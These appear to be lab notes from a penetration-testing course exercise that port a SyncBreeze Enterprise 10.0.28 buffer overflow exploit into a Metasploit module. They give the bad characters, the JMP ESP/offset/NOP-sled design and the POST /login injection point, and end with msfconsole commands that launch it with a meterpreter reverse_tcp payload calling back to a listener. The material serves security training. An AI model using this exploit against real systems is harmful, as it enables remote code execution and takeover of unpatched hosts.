22.4.1.1

# 22.4.1.1.1. Create a new Metasploit module for your SyncBreeze exploit.

Port our SyncBreeze Python exploit to the Metasploit format, using an existing exploit in the framework as a template and copying it to the established folder structure under the home directory of the root user.
`sudo mkdir -p /root/.msf4/modules/exploits/windows/http`

`sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb`

`sudo vi /root/.msf4/modules/exploits/windows/http/syncbreeze.rb`
![5f597419bae731c2730376ecd0995708.png](86a4525056314497919f106c10812ba7.png)


Update the header information, including the name of the module, its description, author, and external references.
![86e8379f4c5416bff6f75dbf03377bef.png](d5177bcc83944db1a672858d2e82aa2c.png)

In the next section, we will select the default options. In this case, we will set EXITFUNC to “thread”and specify the bad characters we found, which are \x00\x0a\x0d\x25\x26\x2b\x3d. Finally, in the Targets section, we will specify the version of SyncBreeze along with the address of the JMP ESP instruction and the offset used to overwrite EIP. 
![0c0b1d289fd80aa7c633d9c463af4bbd.png](6149ae9067db4d3c90e13033a9277a70.png)

Next, we will update the check function, which is done by performing a HTTP GET request to the URL /. On a vulnerable system, the result contains the text “Sync Breeze Enterprise v10.0.28”.
![5e2627cb4b21f5c0e7ad5087c1651306.png](87ed5f77897a4bdeb3ea202597f6db51.png)

The final section is the exploit itself. First, we will create the exploit string, which uses the offset and the memory address for the JMP ESP instruction along with a NOP sled and the payload. Then we’ll send the crafted malicious string through an HTTP POST request using the /login URL as in the original exploit. We will populate the HTTP POST username variable with the exploit string:
![be4513be9f1b7de5b8e2190fc0627e2d.png](311b21fe3cc94f099bcb9c01d941ca81.png)

Start the SyncBreeze service on the Windows client
![7b27b5d99f385368177a665214660b66.png](3689ec13504648b7990920b1a75a478a.png)

Run our exploit
`sudo msfconsole -q`
`search syncbreeze`
`use 1`
`set payload windows/meterpreter/reverse_tcp`
`set rhosts 192.168.214.10`
`set lhost 192.168.119.214`
`check`
`exploit`
`getuid`
![a62daca4666491ca7e99fa926e0af76c.png](5f9cbe423a9c42438ca5eb0dbdf8223e.png)
